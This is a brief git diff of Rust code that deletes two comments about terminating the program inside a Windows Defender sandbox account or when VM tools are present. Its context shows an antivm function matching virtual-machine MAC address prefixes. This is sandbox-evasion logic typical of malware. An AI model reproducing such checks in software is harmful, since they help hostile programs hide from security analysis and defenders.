@@ -4,9 +4,6 @@ use std::fs;
 use regex::Regex;
 use std::process::Command;
 
-// if the current users name is WDAGUtilityAccount kill the program as fast as possible
-// if the system has vmtools installed kill the program
-
 pub fn antivm() {
     // Check the MAC address
     let pattern = Regex::new(r"^08:00:27|00:50:56|00:1C:14|00:0C:29|00:05:69").unwrap();
